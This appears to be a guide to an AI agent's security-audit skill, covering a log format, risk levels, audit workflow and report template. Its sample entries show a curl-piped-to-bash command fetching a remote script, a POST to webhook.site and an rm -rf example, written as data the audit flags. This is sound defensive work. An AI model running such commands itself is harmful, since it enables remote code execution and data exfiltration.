# Audit Guide

## Log Format

Each security log entry is a single JSON line appended to `memory/security-audit.log`:

```json
{
  "ts": "2026-03-16T10:00:00+08:00",
  "session": "main",
  "level": "WARN",
  "category": "exec",
  "summary": "curl piped to bash",
  "detail": "curl https://example.com/install.sh | bash",
  "action": "blocked_soft",
  "user_approved": false
}
```

### Fields

| Field | Values | Description |
|---|---|---|
| `level` | `INFO`, `WARN`, `CRITICAL` | Risk level |
| `category` | `exec`, `file_write`, `network`, `credential`, `persistence` | Type of action |
| `action` | `allowed`, `flagged`, `blocked_soft`, `user_approved` | What happened |
| `user_approved` | bool | Whether user explicitly approved after flag |

---

## Risk Classification

### CRITICAL (always flag + notify)
- Remote code execution patterns
- Credential or key exfiltration
- Persistence mechanism writes (cron, authorized_keys, launchd)
- Privilege escalation

### WARN (flag, log, proceed if context is clear)
- Bulk file deletion (non-temp)
- Sensitive file reads without obvious user intent
- External requests with dynamic URLs
- Shell environment modification

### INFO (log silently)
- Normal workspace file operations
- Standard dev tool execution
- OpenClaw-internal tool calls

---

## Audit Workflow

### Per-Action Soft Check (Real-time)

Before executing a high-risk action, the agent should:

1. **Classify** the action against `dangerous-patterns.md`
2. **Check context**: Was this explicitly requested by the user in this session?
3. **If CRITICAL and NOT explicitly requested**:
   - Decline or request explicit confirmation
   - Log as `blocked_soft`
   - Notify via configured channel
4. **If WARN**:
   - Proceed, but log as `flagged`
   - Mention the action clearly in the reply
5. **If INFO**: Proceed, log silently (or skip logging for high-frequency noise)

**Key principle**: Do not add friction to clearly user-requested actions. A user who types "rm -rf ./dist" is explicitly requesting it — no block needed. A skill that autonomously decides to `rm -rf` something the user didn't ask about is a red flag.

### Periodic Audit

When the user triggers an audit (or the agent runs one proactively):

1. Read `memory/security-audit.log` (last N lines or last N days)
2. Group entries by level and category
3. Look for patterns:
   - Multiple CRITICAL entries in short time → potential compromise or rogue skill
   - Repeated WARN on same pattern → investigate root cause
   - Unexpected credential access → surface immediately
4. Generate a summary report (see report format below)
5. If anomalies found: notify via configured channel

---

## Audit Report Format

```markdown
## Security Audit Report
**Period**: 2026-03-10 → 2026-03-16
**Total Events**: 42 (38 INFO, 3 WARN, 1 CRITICAL)

### CRITICAL
- [2026-03-15 14:22] exec: curl piped to bash — blocked, user notified

### WARN
- [2026-03-14 09:11] file_write: ~/.bashrc modified — flagged, user requested
- [2026-03-13 20:05] network: POST to webhook.site — flagged, skill: summarize

### Summary
No active threats detected. One historical CRITICAL was blocked successfully.
Recommend reviewing the `summarize` skill's network behavior.
```

---

## Notification Configuration

The skill reads notification config from `memory/security-audit-config.json`:

```json
{
  "notify_channel": "dingtalk",
  "notify_on": ["CRITICAL", "WARN"],
  "notify_on_audit_complete": true,
  "audit_schedule_note": "Set up via cron skill — user configures interval"
}
```

If the file does not exist, default to: log only, no proactive notification.

---

## Setup Checklist (for new users)

1. Skill installs automatically when triggered
2. Agent creates `memory/security-audit.log` on first event
3. User optionally creates `memory/security-audit-config.json` to enable notifications
4. User optionally adds an audit cron job via the `cron` tool
5. Done — no other setup required
